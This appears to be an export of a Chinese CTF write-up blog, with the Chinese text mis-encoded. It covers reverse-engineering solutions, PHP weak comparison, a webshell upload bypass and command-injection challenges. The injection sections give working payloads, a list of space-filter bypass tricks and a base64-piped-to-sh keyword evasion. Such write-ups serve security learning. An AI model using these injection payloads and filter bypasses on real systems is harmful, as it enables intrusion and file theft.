= v5 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v6 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v6) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">            v4 = v6 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = aAbcdefghijklmn[(<span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">            v7 = v4 + <span class="number">1</span>;</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>))];</span><br><span class="line">            *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">            v4 = v7 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="type">unsigned</span> <span class="type">char</span>*)v12 + v4) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> a[] = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">unknown</span>(a, <span class="built_in">sizeof</span>(a)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//SGVsbG8gV29ybGQhAA==</span></span><br><span class="line"><span class="comment">//çœ‹èµ·æ¥æ˜¯è¿›è¡Œbase64ç¼–ç çš„å‡½æ•°</span></span><br></pre></td></tr></table></figure>
<p>çŸ¥é“äº†è¿™ä¸ªå‡½æ•°çš„ä½œç”¨,
æ¥ä¸‹æ¥åªéœ€è¦å¤„ç†ä¸€ä¸‹å­—ç¬¦çš„ç§»ä½å°±å¯ä»¥è¿˜åŸå‡ºåŸæ–‡äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;e3nifIH9b_C@n@dH&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ciphertext[i])-i)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(plaintext).decode())</span><br><span class="line"><span class="comment">#&#123;i_l0ve_you&#125;</span></span><br></pre></td></tr></table></figure>
<p>éªŒè¯ä¸€ä¸‹, æ²¡æ¯›ç—…</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212301676.png"
alt="image-20220121230115616" />
<figcaption aria-hidden="true">image-20220121230115616</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>[BUUCTF]ç®€å•æ³¨å†Œå™¨</title>
    <url>/2022/01/23/%5BReverse%5D%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A8/</url>
    <content><![CDATA[<p>åˆæ˜¯ä¸ªapk, ç›´æ¥ä¸Š<code>jadx</code>, åç¼–è¯‘<code>MainActivity</code>,
ç›´æ¥æ‰¾åˆ°å…³é”®ç®—æ³•</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231736348.png"
alt="image-20220123173641201" />
<figcaption aria-hidden="true">image-20220123173641201</figcaption>
</figure>
<p><code>Ctrl+C</code>, <code>Ctrl+V</code>å¤åˆ»</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> x[] = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>;</span><br><span class="line">    x[<span class="number">2</span>] = (<span class="type">char</span>)((x[<span class="number">2</span>] + x[<span class="number">3</span>]) - <span class="number">50</span>);</span><br><span class="line">    x[<span class="number">4</span>] = (<span class="type">char</span>)((x[<span class="number">2</span>] + x[<span class="number">5</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">30</span>] = (<span class="type">char</span>)((x[<span class="number">31</span>] + x[<span class="number">9</span>]) - <span class="number">48</span>);</span><br><span class="line">    x[<span class="number">14</span>] = (<span class="type">char</span>)((x[<span class="number">27</span>] + x[<span class="number">28</span>]) - <span class="number">97</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> a = x[<span class="number">31</span> - i];</span><br><span class="line">        x[<span class="number">31</span> - i] = x[i];</span><br><span class="line">        x[i] = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>é€†å‘</tag>
        <tag>Javaé€†å‘</tag>
        <tag>Androidé€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile 1</title>
    <url>/2021/11/06/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile-1/</url>
    <content><![CDATA[<p>æƒ¯ä¾‹, ç”¨<code>dirsearch</code>æ‰«æä¸€ä¸‹,
æ‰«åˆ°ä¸ª<code>index.php.bak</code></p>
<blockquote>
<p><code>dirsearch</code>é¡¹ç›®åœ°å€: <a
href="https://github.com/maurosoria/dirsearch">Github</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111062359818.png"
alt="image-20211106235918753" />
<figcaption aria-hidden="true">image-20211106235918753</figcaption>
</figure>
<p>æºä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å®¡è®¡ä»£ç ,
å½“<code>$key</code>ä¸ºæ•°å­—ä¸”ä¸<code>$str</code>å¼±ç›¸ç­‰çš„æ—¶å€™å³å¯æ˜¾ç¤ºå‡º<strong>flag</strong></p>
<blockquote>
<p><code>php</code>å¼±ç±»å‹æ¯”è¾ƒ:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒä½¿ç”¨==æ—¶,å­—ç¬¦ä¸²ä¼šå…ˆè½¬æ¢ä¸ºæ•°å­—ç±»å‹å†æ¯”è¾ƒ</span><br><span class="line">var_dump(&#x27;a&#x27; == 0);//trueï¼Œæ­¤æ—¶aå­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆæ•°å­—ï¼Œå› ä¸ºaå­—ç¬¦ä¸²å¼€å¤´ä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œæ‰€ä»¥è½¬æ¢ä¸º0</span><br><span class="line">var_dump(&#x27;123a&#x27; == 123);//trueï¼Œè¿™é‡Œ&#x27;123a&#x27;ä¼šè¢«è½¬æ¢ä¸º123</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;a123&#x27; == 123);//falseï¼Œå› ä¸ºphpä¸­æœ‰è¿™æ ·ä¸€ä¸ªè§„å®šï¼šå­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œå®ƒè¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚</span><br><span class="line">ä¸¾ä¾‹ï¼š</span><br><span class="line">var_dump(&#x27;123a1&#x27; == 123);//true</span><br><span class="line">var_dump(&#x27;1233a&#x27; == 123);//false</span><br></pre></td></tr></table></figure>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111091646185.png"
alt="image-20211109164631082" />
<figcaption aria-hidden="true">image-20211109164631082</figcaption>
</figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 æ–°ç”Ÿèµ›]Exec 1</title>
    <url>/2021/10/30/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Exec-1/</url>
    <content><![CDATA[<p>é¦–å…ˆæŸ¥çœ‹æºä»£ç ,ä¸€æ— æ‰€è·,å°è¯•è¾“å…¥<code>127.0.0.1</code>, æœ‰å›æ˜¾</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301304951.png"
alt="image-20211030130427904" />
<figcaption aria-hidden="true">image-20211030130427904</figcaption>
</figure>
<p>æ¥ç€å°è¯•ç»„åˆå‘½ä»¤<code>127.0.0.1&amp;&amp;ls</code>,å¤±è´¥</p>
<p>å†å°è¯•<code>127.0.0.1;ls</code>æˆåŠŸ(å®æµ‹è¿™é‡Œä¹Ÿå¯ä»¥ç”¨<code>127.0.0.1||ls</code>,
ä½†æ˜¯ç”¨åˆ†å·æœ€ç¨³å¦¥, ä¸ç®¡å‰é¢çš„è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸåé¢çš„è¯­å¥éƒ½ä¼šæ‰§è¡Œ)<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301303157.png"
alt="image-20211030130359106" /></p>
<p><code>127.0.0.1||ls&amp;&amp;cat index.php</code>è¾“å‡º<code>index.php</code>çš„æºä»£ç ,
ç”±äºè¾“å‡ºåœ¨ç½‘é¡µä¸Šä¼šè‡ªåŠ¨è§£ææˆç½‘é¡µ, æ‰€ä»¥éœ€è¦å³é”®æŸ¥çœ‹æºä»£ç æ‰èƒ½çœ‹åˆ°<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301311590.png"
alt="image-20211030131153532" /></p>
<p>å¯è§åå°å†…å®¹ååˆ†ç®€å•æ²¡æœ‰ä»»ä½•å®¡æŸ¥,
å°è¯•æ„é€ payloadåˆ°æ ¹ç›®å½•å¯»æ‰¾<strong>flag</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301315276.png"
alt="image-20211030131524211" />
<figcaption aria-hidden="true">image-20211030131524211</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ª<strong>flag</strong>æ–‡ä»¶,
æˆ‘ä»¬åªéœ€è¦å°†å®ƒæ‰“å°å‡ºæ¥å³å¯,å°†payloadæ”¹ä¸º</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target=127.0.0.1;cd ../../../../../;ls -la;cat flag;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110301317663.png"
alt="image-20211030131706602" />
<figcaption aria-hidden="true">image-20211030131706602</figcaption>
</figure>
<p><strong>flag</strong>åˆ°æ‰‹~</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[GXYCTF2019]Ping Ping Ping 1</title>
    <url>/2021/10/30/%5BWeb%5DGXYCTF2019-Ping-Ping-Ping-1/</url>
    <content><![CDATA[<p>çœ‹é¡µé¢æç¤º, æ˜¾ç„¶æ˜¯<code>get</code>è¯·æ±‚æäº¤å‚æ•°, è¾“å…¥ä¸€ä¸ªipè¯•è¯•æ°´</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310017150.png"
alt="image-20211031001710090" />
<figcaption aria-hidden="true">image-20211031001710090</figcaption>
</figure>
<p>æ­£å¸¸å›æ˜¾, æ¥ä¸ª<code>ls</code>çœ‹çœ‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310018603.png"
alt="image-20211031001843555" />
<figcaption aria-hidden="true">image-20211031001843555</figcaption>
</figure>
<p>åš¯, å¥½å®¶ä¼™, flag.phpå°±åœ¨è¿™é‡Œäº†,
è¿™ä¸å¾—<code>cat flag.php</code>æå®ƒä¸€æ‰‹?</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110310020463.png"
alt="image-20211031002002407" />
<figcaption aria-hidden="true">image-20211031002002407</figcaption>
</figure>
<p>è¿˜æ˜¯Too Young, ç©ºæ ¼è¢«è¿‡æ»¤ä¸è®©ç”¨, çœ‹æ ·å­è‚¯å®šæ²¡é‚£ä¹ˆç®€å•,
é‚£ä¹ˆå°±éœ€è¦ç»•è¿‡ç©ºæ ¼</p>
<blockquote>
<p>å¸¸è§çš„ç»•è¿‡ç©ºæ ¼è¿‡æ»¤çš„æ–¹æ³•:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS    //Ubuntu20.04æµ‹è¯•é€šè¿‡, ä½†æ˜¯åé¢ä¸èƒ½ç›´æ¥è·Ÿå­—ç¬¦,åº”è¯¥ç”¨å­—ç¬¦å˜é‡.æ¯”å¦‚str1=fl;str2=ag.php;cat$IFS$str1$str2æ˜¯å¯¹çš„,è€Œcat$IFSflagæ˜¯é”™çš„</span><br><span class="line">$&#123;IFS&#125;  //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">$IFS$1  //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">$IFS$9  //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">&lt;       //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">&lt;&gt;      //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">&#123;cat,flag.php&#125;   //Ubuntu20.04æµ‹è¯•é€šè¿‡</span><br><span class="line">$&#x27;\x09&#x27;  //Ubuntu20.04æµ‹è¯•é€šè¿‡,\x09æ˜¯åˆ¶è¡¨ç¬¦.ä½¿ç”¨æ–¹æ³•,æ¯”å¦‚a=$&#x27;cat\x09flag&#x27;;$a</span><br><span class="line">$&#x27;\x20&#x27;  //Ubuntu20.04æµ‹è¯•é€šè¿‡,\x20æ˜¯ç©ºæ ¼.ä½¿ç”¨æ–¹æ³•åŒä¸Š</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311159568.png"
alt="image-20211031115928471" />
<figcaption aria-hidden="true">image-20211031115928471</figcaption>
</figure>
<p>emmmm, ç©ºæ ¼æ˜¯ç»•è¿‡å»äº†, ä½†æ˜¯è¿˜æœ‰ä¸€é“<strong>flag</strong>å…³é”®è¯æ£€æµ‹.
æˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹<code>index.php</code>é‡Œçš„è¿‡æ»¤è§„åˆ™:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311244151.png"
alt="image-20211031124448093" />
<figcaption aria-hidden="true">image-20211031124448093</figcaption>
</figure>
<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤çš„å†…å®¹è¿˜æ˜¯ç›¸å½“å¤šçš„,
æœ€è¿‡åˆ†çš„æ˜¯<strong>flag</strong>å…³é”®è¯æ£€æµ‹, å¯è°“ååˆ†ç²—æš´</p>
<h2 id="æ–¹æ³•ä¸€-å®šä¹‰å˜é‡ç»•è¿‡å…³é”®è¯æ£€æµ‹">æ–¹æ³•ä¸€
å®šä¹‰å˜é‡ç»•è¿‡å…³é”®è¯æ£€æµ‹:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;str1=fl;str2=ag.php;cat$IFS$str1$str2</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311202013.png"
alt="image-20211031120239967" />
<figcaption aria-hidden="true">image-20211031120239967</figcaption>
</figure>
<p>è¿˜æ˜¯ä¸è¡Œ,
çœ‹æ ·å­æ˜¯è¦<strong>flag</strong>å››ä¸ªå­—æ¯é¡ºåºå‡ºç°åœ¨å‘½ä»¤é‡Œå°±ä¸è¡Œ, é‚£å¥½åŠ,
å˜é‡ä¿©è°ƒæ¢ä¸€ä¸‹ä½ç½®å°±å¯ä»¥äº†:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;str2=ag.php;str1=fl;cat$IFS$str1$str2</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311228589.png"
alt="image-20211031122853535" />
<figcaption aria-hidden="true">image-20211031122853535</figcaption>
</figure>
<p>å›æ˜¾æ²¡äº†? ä¸æ…Œ, å¯èƒ½æ˜¯æ³¨é‡Š, æŸ¥çœ‹æºç , <strong>flag</strong>åˆ°æ‰‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311229141.png"
alt="image-20211031122921119" />
<figcaption aria-hidden="true">image-20211031122921119</figcaption>
</figure>
<h2 id="æ–¹æ³•äºŒ-base64ç¼–ç åè§£ç æ‰§è¡Œ">æ–¹æ³•äºŒ base64ç¼–ç åè§£ç æ‰§è¡Œ</h2>
<p>åˆ©ç”¨ç®¡é“ç¬¦, å…ˆå°†å‘½ä»¤ç”¨base64ç¼–ç , å†è§£ç ä¼ ç»™shæ‰§è¡Œ,
è¿™é‡Œè¿˜è¦é‡‡ç”¨<code>%IFS$1</code>ç»•è¿‡ç©ºæ ¼é™åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>
<p>ç»“æœåŒä¸Š</p>
<h2 id="æ–¹æ³•ä¸‰-åˆ©ç”¨åå¼•å·å†…è”æ‰§è¡Œ">æ–¹æ³•ä¸‰ åˆ©ç”¨åå¼•å·å†…è”æ‰§è¡Œ</h2>
<p>åŒæ ·çš„, è¿™é‡Œä¹Ÿéœ€è¦ç”¨åˆ°<code>$IFS$1</code>ç»•è¿‡ç©ºæ ¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=127.0.0.1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202110311234828.png"
alt="image-20211031123455770" />
<figcaption aria-hidden="true">image-20211031123455770</figcaption>
</figure>
<p>æŸ¥çœ‹æºç , å¯è§index.phpå’Œflag.phpéƒ½è¢«æ˜¾ç¤ºäº†å‡ºæ¥</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>[ACTF2020 æ–°ç”Ÿèµ›]Upload 1</title>
    <url>/2021/11/01/%5BWeb%5DACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload-1/</url>
    <content><![CDATA[<p>è¿›å»å°±æ˜¯ä¸ªç¯æ³¡, é¼ æ ‡ç§»åˆ°ç¯æ³¡ä¸Šå‡ºç°æ–‡ä»¶é€‰æ‹©æ¡†</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122375.png"
alt="image-20211101212238225" />
<figcaption aria-hidden="true">image-20211101212238225</figcaption>
</figure>
<p>è¯•ç€ä¸Šä¼ ä¸€ä¸ª<code>php</code>åç¼€ä¸€å¥è¯æœ¨é©¬</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012122521.png"
alt="image-20211101212227434" />
<figcaption aria-hidden="true">image-20211101212227434</figcaption>
</figure>
<p>å‰ç«¯é™åˆ¶åç¼€, ç›´æ¥BPæŠ“åŒ…æ”¹åç¼€</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012118453.png"
alt="image-20211101211857333" />
<figcaption aria-hidden="true">image-20211101211857333</figcaption>
</figure>
<p>åç«¯ä¹Ÿæœ‰é™åˆ¶, ä¼ ç»Ÿè‰ºèƒ½, æ”¹åç¼€ä¸º<code>phtml</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012120107.png"
alt="image-20211101212015986" />
<figcaption aria-hidden="true">image-20211101212015986</figcaption>
</figure>
<p>æ–‡ä»¶ç›´æ¥ä¸Šä¼ æˆåŠŸ, æ¥ä¸‹æ¥å°±æ˜¯èœåˆ€æ—¶é—´</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202111012121920.png"
alt="image-20211101212139849" />
<figcaption aria-hidden="true">image-20211101212139849</figcaption>
</figure>
<p><strong>flag</strong>å°±åœ¨æ ¹ç›®å½•</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>PHPçš„__wakeup()å‡½æ•°æ¼æ´</title>
    <url>/2023/04/06/%5BWeb%5DPHP%E7%9A%84__wakeup()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><code>unserialize()</code> ååºåˆ—åŒ–äº§ç”Ÿä¸€ä¸ªå¯¹è±¡æ—¶,
ä¼šæ£€æŸ¥å¯¹è±¡æ˜¯å¦å­˜åœ¨ä¸€ä¸ª<code>__wakeup()</code>æ–¹æ³•,
å¦‚æœæœ‰åˆ™å…ˆè°ƒç”¨å®ƒè¿›è¡Œååºåˆ—åŒ–å‰çš„å‡†å¤‡å·¥ä½œ, ä¾‹å¦‚é‡æ–°å»ºç«‹æ•°æ®åº“è¿æ¥,
æˆ–æ‰§è¡Œå…¶å®ƒåˆå§‹åŒ–æ“ä½œ.</p>
<p>å®˜æ–¹ç¤ºä¾‹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$this</span>-&gt;server, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$this</span>-&gt;db, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“è¢«ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºå¯¹è±¡å®é™…çš„ä¸ªæ•°æ—¶,
<code>__wakeup()</code>å°†è¢«è·³è¿‡æ‰§è¡Œ.</p>
<p>å®éªŒ:</p>
